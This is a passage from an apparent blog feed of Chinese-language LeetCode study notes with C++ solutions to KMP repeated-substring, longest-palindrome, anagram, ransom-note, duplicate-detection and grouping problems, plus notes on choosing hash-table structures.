class="keyword">int</span>* next, <span class="keyword">const</span> string&amp; s)</span></span>&#123;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;s.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; s[i]!=s[j+<span class="number">1</span>])&#123;</span><br><span class="line">                j = next[j];<span class="comment">//这里</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[j+<span class="number">1</span>])&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span> <span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">size</span>()==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> next[s.<span class="built_in">size</span>()];</span><br><span class="line">        <span class="built_in">getNext</span>(next, s);</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//最长相等前后缀的长度:len-(next[len-1]+1)</span></span><br><span class="line">        <span class="keyword">if</span> (next[len<span class="number">-1</span>]!=<span class="number">-1</span> &amp;&amp; len%(len-(next[len<span class="number">-1</span>]+<span class="number">1</span>))==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前缀表不改动!!!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getNext</span> <span class="params">(<span class="keyword">int</span>* next, <span class="keyword">const</span> string&amp; s)</span></span>&#123;</span><br><span class="line">        next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;s.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&gt;<span class="number">0</span> &amp;&amp; s[i]!=s[j]) &#123;</span><br><span class="line">                j = next[j<span class="number">-1</span>];<span class="comment">//这里</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[j]) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span> <span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">size</span>()==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> next[s.<span class="built_in">size</span>()];</span><br><span class="line">        <span class="built_in">getNext</span>(next, s);</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//最长相等前后缀的长度:len-(next[len-1])</span></span><br><span class="line">        <span class="keyword">if</span> (next[len<span class="number">-1</span>]!=<span class="number">0</span> &amp;&amp; len%(len-(next[len<span class="number">-1</span>]))==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="524-通过删除字母匹配到字典里最长单词——不连续"><a href="#524-通过删除字母匹配到字典里最长单词——不连续" class="headerlink" title="524 通过删除字母匹配到字典里最长单词——不连续"></a>524 通过删除字母匹配到字典里最长单词——不连续</h3><p>给你一个字符串 s 和一个字符串数组 dictionary ，找出并返回 dictionary 中<strong>最长的</strong>字符串，该字符串可以<strong>通过删除 s 中的某些字符</strong>得到。【不是 s的字串】<br>【如果答案不止一个】，返回<strong>长度最长</strong>且<strong>字母序最小</strong>的字符串。如果答案不存在，则返回空字符串。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">findLongestWord</span><span class="params">(string s, vector&lt;string&gt;&amp; dictionary)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(dictionary.<span class="built_in">begin</span>(), dictionary.<span class="built_in">end</span>(), [](string&amp; a, string&amp; b)&#123;<span class="comment">//按照 长度排序，长度一致则按照 下标排序</span></span><br><span class="line">            <span class="keyword">if</span>(a.<span class="built_in">length</span>() == b.<span class="built_in">length</span>()) <span class="keyword">return</span> a &lt; b;</span><br><span class="line">            <span class="keyword">return</span> a.<span class="built_in">length</span>() &gt; b.<span class="built_in">length</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ss:dictionary)&#123;</span><br><span class="line">            <span class="keyword">int</span> m = ss.<span class="built_in">size</span>();<span class="comment">//字典中 某字符串</span></span><br><span class="line">            <span class="keyword">if</span>(m&gt;n) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;<span class="comment">//双指针</span></span><br><span class="line">            <span class="keyword">while</span>(i&lt;n &amp;&amp; j&lt;m)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i]==ss[j])</span><br><span class="line">                    j++;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">if</span>(j==m)</span><br><span class="line">                    <span class="keyword">return</span> ss;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="409-最长回文串——不连续-构造"><a href="#409-最长回文串——不连续-构造" class="headerlink" title="409 最长回文串——不连续-构造"></a>409 最长回文串——不连续-构造</h2><p>给定一个包含大写字母和小写字母的字符串 s ，返回 通过这些字母【构造成的 最长的回文串】 。<br>在构造过程中，请注意 区分大小写 。比如 “Aa” 不能当做一个回文字符串。</p><pre><code>示例 1:输入:s = &quot;abccccdd&quot;输出:7解释:我们可以构造的最长的回文串是&quot;dccaccd&quot;, 它的长度是 7。</code></pre><p><strong>回文串中【个数是奇数个的字符】【最多只能有一个】</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c:s)&#123;</span><br><span class="line">            maap[c]++;<span class="comment">//记录每个字符个数</span></span><br><span class="line">            <span class="keyword">if</span>(maap[c]==<span class="number">2</span>)&#123;</span><br><span class="line">                res += <span class="number">2</span>;<span class="comment">//遇2，长度+2</span></span><br><span class="line">                maap[c] = <span class="number">0</span>;<span class="comment">//恢复为0</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res &lt; n)</span><br><span class="line">            res++;<span class="comment">//若最终长度小于字符串本身长度，证明该字符串中包含个数是奇数个的字符，再+1就好</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>四、哈希表</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E5%9B%9B%E3%80%81%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E5%9B%9B%E3%80%81%E5%93%88%E5%B8%8C%E8%A1%A8/</id>
    <published>2025-12-03T06:12:45.000Z</published>
    <updated>2025-12-03T06:12:26.369Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="四、哈希表"><a href="#四、哈希表" class="headerlink" title="四、哈希表"></a>四、哈希表</h2><ul><li>一般哈希表都是用来<strong>快速判断一个元素是否出现集合里 O(n)</strong></li><li>当<strong>需要查询一个元素是否出现过</strong>，或者<strong>一个元素是否在集合里</strong>的时候，就要第一时间想到哈希法</li><li>哈希法<strong>牺牲了空间换取了时间</strong>，因为我们要使用额外的数组，set或者是map来存放数据，才能实现快速的查找。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;::iterator it=maap.<span class="built_in">begin</span>();it!=maap.<span class="built_in">end</span>();it++)</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;map: &quot;</span>&lt;&lt; (*it).first &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; (*it).second &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">cout &lt;&lt; endl;</span><br></pre></td></tr></table></figure></li></ul><p><strong>三种可选结构：</strong></p><ul><li>数组</li><li>set （集合）</li><li>map(映射)</li></ul><p><img src="https://img-blog.csdnimg.cn/8dc7a3fbde064bd59796f523b58b2f2f.png"><br><strong>选择：</strong></p><ul><li>当我们要使用集合来解决哈希问题的时候，优先使用unordered_set，因为它的查询和增删效率是最优的，如果需要集合是有序的，那么就用set，如果要求不仅有序还要有重复数据的话，那么就用multiset</li></ul><h3 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="242 有效的字母异位词"></a>242 有效的字母异位词</h3><p>给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。<br>注意：若 s 和 t 中每个字符出现的次数都相同，则称 s 和 t 互为字母异位词。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表  maap[s[i]]++;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">length</span>() != t.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//长度不同，直接false</span></span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; maap;<span class="comment">//map记录【次数】</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            maap[s[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;t.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            maap[t[j]]--;</span><br><span class="line">            <span class="comment">//重点</span></span><br><span class="line">            <span class="keyword">if</span>(maap[t[j]]==<span class="number">0</span>)<span class="comment">//两串某字符次数相同</span></span><br><span class="line">                maap.<span class="built_in">erase</span>(t[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maap.<span class="built_in">empty</span>())<span class="comment">//判空：erase后才会清空该元素</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    用数组 record[s[i]-&#x27;a&#x27;]++;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> record[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//26个字母</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 并不需要记住字符a的ASCII，只要求出一个相对数值就可以了</span></span><br><span class="line">            record[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            record[t[i] - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;<span class="comment">//遍历数组</span></span><br><span class="line">            <span class="keyword">if</span> (record[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// record数组如果有的元素不为零0，说明字符串s和t 一定是谁多了字符或者谁少了字符。</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// record数组所有元素都为零0，说明字符串s和t是字母异位词</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//取巧：排序后直接比较是否相同</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">length</span>() != t.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(t.<span class="built_in">begin</span>(),t.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> s==t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="383-赎金信"><a href="#383-赎金信" class="headerlink" title="383 赎金信"></a>383 赎金信</h3><p>给你两个字符串：ransomNote 和 magazine ，判断 ransomNote 能不能由 magazine 里面的字符构成。<br>如果可以，返回 true ；否则返回 false 。<br>magazine 中的每个字符只能在 ransomNote 中【使用一次】。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//哈希  unordered_map&lt;char,int&gt; maap;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canConstruct</span><span class="params">(string ransomNote, string magazine)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">if</span>(magazine.<span class="built_in">size</span>()&lt;ransomNote.<span class="built_in">size</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;magazine.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            maap[magazine[i]]++;<span class="comment">//记录 字典字符 次数</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;ransomNote.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(maap.<span class="built_in">count</span>(ransomNote[i]) &amp;&amp; maap[ransomNote[i]] != <span class="number">0</span>)&#123;<span class="comment">//注意是两个条件</span></span><br><span class="line">                maap[ransomNote[i]]--;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组    record[magazine[i]-&#x27;a&#x27;]++;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canConstruct</span><span class="params">(string ransomNote, string magazine)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> record[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">//add</span></span><br><span class="line">        <span class="keyword">if</span> (ransomNote.<span class="built_in">size</span>() &gt; magazine.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; magazine.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 通过recode数据记录 magazine里各个字符出现次数</span></span><br><span class="line">            record[magazine[i]-<span class="string">&#x27;a&#x27;</span>] ++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; ransomNote.<span class="built_in">length</span>(); j++) &#123;</span><br><span class="line">            <span class="comment">// 遍历ransomNote，在record里对应的字符个数做--操作</span></span><br><span class="line">            record[ransomNote[j]-<span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">            <span class="comment">// 如果小于零说明ransomNote里出现的字符，magazine没有</span></span><br><span class="line">            <span class="keyword">if</span>(record[ransomNote[j]-<span class="string">&#x27;a&#x27;</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="217-存在重复元素"><a href="#217-存在重复元素" class="headerlink" title="217 存在重复元素"></a>217 存在重复元素</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    排序：重复元素 位置相邻</span></span><br><span class="line"><span class="comment">    O(N logN)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">containsDuplicate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == nums[i+<span class="number">1</span>])<span class="comment">//相邻元素相等 </span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(n)  unordered_set&lt;int&gt; s;</span></span><br><span class="line"><span class="comment">    s.find(x)!=s.end()</span></span><br><span class="line"><span class="comment">    s.count(x)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">containsDuplicate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x: nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s.<span class="built_in">find</span>(x) != s.<span class="built_in">end</span>())<span class="comment">//找到了，证明有重复</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            s.<span class="built_in">insert</span>(x);<span class="comment">//没找到 则插入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="49-字母异位词分组"><a href="#49-字母异位词分组" class="headerlink" title="49 字母异位词分组"></a>49 字母异位词分组</h3><p>输入: strs = [“eat”, “tea”, “tan”, “ate”, “nat”, “bat”]<br>输出: [ [“bat”],[“nat”,”tan”],[“ate”,”eat”,”tea”] ]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  哈希表</span></span><br><span class="line"><span class="comment">    unordered_map&lt;string, vector&lt;string&gt;&gt; maap;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span 